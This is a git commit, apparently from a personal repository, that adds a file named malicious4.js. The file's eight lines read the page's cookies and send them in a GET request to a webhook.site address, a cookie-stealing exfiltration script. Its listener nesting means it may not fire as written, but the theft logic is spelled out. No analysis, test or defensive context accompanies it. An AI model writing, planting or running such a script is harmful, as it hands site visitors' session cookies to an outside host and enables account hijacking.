c763e49a761eb32bc96d7b44cce1693dfa45eb2f
Jasper-LiEs <lijasper012@gmail.com>
2024-02-21 17:04:26 +0800

    Add files via upload

---
+++ malicious4.js
@@ -0,0 +1,8 @@
+window.addEventListener('load', function() {
+  document.addEventListener('DOMContentLoaded', function() {
+    var cookies = document.cookie; // 获取当前页面的cookies
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://webhook.site/a1a42fea-588b-4dcc-9f00-f52c22c8c97d?cookies=' + encodeURIComponent(cookies), true);
+    xhr.send();
+  });
+});
